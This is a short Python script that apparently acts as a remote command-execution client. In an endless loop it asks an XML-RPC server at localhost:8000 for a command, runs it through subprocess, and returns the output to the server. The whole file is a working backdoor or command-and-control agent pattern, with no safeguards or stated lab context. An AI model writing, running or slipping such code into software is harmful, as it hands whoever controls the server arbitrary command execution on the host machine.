import xmlrpc.client
import subprocess
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output
def connect_to_server():
    server_url = "http://localhost:8000"
    proxy = xmlrpc.client.ServerProxy(server_url)
    
    command = proxy.command()
    output = Exec(command).decode()
    proxy.response(output)

if __name__ == "__main__":
    while True:
        connect_to_server()
